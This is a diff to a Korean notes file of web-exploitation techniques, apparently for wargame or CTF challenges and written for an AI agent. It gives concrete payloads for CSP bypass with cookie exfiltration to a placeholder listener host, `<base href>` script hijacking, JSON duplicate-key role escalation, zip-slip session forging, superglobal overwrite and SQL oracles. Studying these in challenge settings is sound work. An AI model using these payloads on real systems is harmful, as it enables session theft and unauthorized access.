@@ -159,6 +159,41 @@ await fetch('/challenge/web-01/', {credentials:'include'}).then(r=>r.text())
   `is_numeric()`에 숫자를 보이며 비숫자 로그인 세션을 유지할 수 없다 → 인증된 숫자 세션(strict_mode off 고정, 비번
   로그인 필요)이 있어야 풀림 → 쿠키-only로는 차단 (old-60).
 
+- **상태코드별 비밀 노출(Apache ErrorDocument 하베스팅)**: "특정 4XX를 내면 키를 준다"류는 각 HTTP 상태코드마다 다른
+  ErrorDocument가 `your key : KEY{...}`를 반환한다. N개 키 = N개 서로 다른 4xx 코드를 각각 유발해 수집 후 한 번에 제출.
+  유발 레시피(요청 1회씩, 측정적): 400=`/%`(잘못된 %인코딩)·`Host: bad host`; 403=디렉터리 리스팅(`/img/`); 404=없는 경로;
+  405=`TRACE /`(TraceEnable off); 408=미완성 요청(`/dev/tcp`로 부분 헤더 전송 후 >20s 대기, mod_reqtimeout 발화 — curl로는
+  안 되고 raw 소켓 필요); 412=`If-Match: "x"` + POST; 414=초장문 URI(수천 자); 416=만족불가 `Range:`(파일 크기 초과 시작);
+  417=`Expect: 100-xyz`. (431 과대헤더는 Apache가 400으로 접어 400과 충돌하니 주의.)
+- **CSP `script-src https://*.google.com/` 우회(admin-bot XSS)**: 반사 XSS인데 CSP가 구글 서브도메인 스크립트만 허용하면
+  *.google.com의 JSONP/오픈콜백 가젯으로 임의 JS를 실행한다. `default-src`가 없으면 img/connect는 자유이므로
+  `new Image().src='//<리스너>/?c='+document.cookie`로 admin 쿠키(=플래그) 반출. **인프라게이트**: admin-bot에 도달 가능한
+  공인 인바운드 리스너 필요(NAT 뒤·포워딩 없음이면 불가).
+- **nonce 전용 CSP 우회 = `<base href>` 하이재킹**: CSP가 `script-src 'nonce-<매요청 난수>'`뿐이고 주입점이 합법
+  `<script src=/script.js nonce=VALID>` **앞**에 있으면, nonce는 매번 바뀌어 위조 불가하지만 `<base href=//<attacker>/>`를
+  주입하면 `/script.js`가 attacker 호스트로 해석되어 로드된다 — **nonce는 태그를 검증할 뿐 출처(origin)는 검증 안 하므로**
+  attacker의 script.js가 유효 nonce로 실행된다. 이후 쿠키 반출(default-src 없으면 자유). **인프라게이트**: script.js 호스팅+
+  반출 수신용 공인 서버가 admin-bot에서 도달 가능해야 함(NAT면 불가).
+- **JSON 중복키 파서 불일치(PHP↔MySQL)**: 가입이 raw `php://input`을 그대로 저장하고 로그인이 `JSON_EXTRACT(data,'$.role')`를
+  쓰면, **PHP `json_decode`는 중복키의 LAST를, MySQL JSON 파서는 FIRST를** 취한다. 검증(`role==="guest"`)은 PHP가 보는 LAST로
+  통과시키고, 권한 평가는 MySQL이 보는 FIRST로 상승 → body `{"userid":"aaaaa","userpw":"aaaaa","role":"admin","role":"guest"}`
+  (admin 먼저, guest 나중). 값 타입/키 화이트리스트 검사는 decode된 배열(중복키는 1개)만 보므로 통과 (new-17).
+- **zip-slip로 PHP 세션파일 덮어쓰기(랜덤 접미사 우회)**: `copy("zip://tmp#<entry>","./upload/<entry><rand>")`류 업로드가
+  확장자에 rand를 붙여 웹셸(.php<rand>는 plain text 서빙)을 막아도, **세션파일을 심으면** 된다. zip 엔트리명을
+  `../../../../../../var/lib/php/sessions/sess_<내가정한id>`로, 내용은 `uid|s:5:"admin";`(원하는 세션 직렬화)로. 서버가 출력하는
+  `<dest><rand> uploaded.`에서 **rand를 알게 되므로** 최종 파일명 `sess_<id><rand>`를 그대로 쿠키 `PHPSESSID=<id><rand>`로 설정
+  (use_strict_mode=0이면 미지 id도 채택) → 다음 요청에서 위조 세션 로드. `uploaded.` vs `upload failed.`는 **디렉터리 존재/쓰기권한
+  오라클**(세션 save_path 탐색: /var/lib/php/sessions, /tmp 등). 경로엔 `../`를 넉넉히(루트 초과분은 무시됨) (old-15015).
+- **variable-variables + 정규식 우회로 임의 변수 세팅**: `parse_str($_SERVER['QUERY_STRING'],$a); foreach($a as $k=>$v)$$k=$v;`는
+  쿼리스트링으로 임의 PHP 변수를 덮는다. 금지어 필터(`/session/i` 등)가 **raw 쿼리스트링**에 적용되면, 글자 하나를 퍼센트인코딩
+  (`_%53ESSION` → parse_str이 %53→S 복원)해 정규식만 피하면 `$_SESSION` 같은 수퍼글로벌도 통째로 덮을 수 있다
+  (`?_%53ESSION%5Bformat%5D=...` → `$_SESSION=['format'=>...]`). 세션에 보관되는 sprintf 포맷/쿼리 템플릿을 장악하는 통로 (old-16).
+- **`CONVERT(col,CHAR(N))` 접두 불린 오라클 + 24자 제한 안에서 case 복구**: 컬럼식이 짧은 길이로 잘릴 때(`preg_replace`+길이컷),
+  `convert(secret,char(N))='<N자 추측>'`는 secret의 **첫 N글자**를 **대소문자 무시(ci 콜레이션)**로 비교하는 접두 오라클
+  (`<h2>Search` 리터럴 출력으로 참 판정 — 하이라이트된 소스의 `&lt;h2&gt;Search`와 구분). 대소문자는 **`convert(secret,binary)`**
+  (22자, ≤24)가 **대소문자 구분 전체 비교**이므로 ci로 뽑은 글자열에 case만 브루트. `binary(N)`은 25자라 **잘린 cs 오라클은 예산
+  초과** → 전체 cs 비교로 케이스만 확정. 쿼리에 `[` `]`가 들어가면 **curl은 반드시 `-g`**(globbing)로 보낼 것(안 그러면 파라미터 증발).
+
 ## 4. 병렬 서브에이전트
 - **순수 계산** 위임: 필터 역산(문자열 변환식의 역상 탐색 — old-24 IP 필터는 길이 20 페이로드를 서브에이전트가 전수탐색),
   크립토, 해시/인코딩 브루트포스, 디코딩.
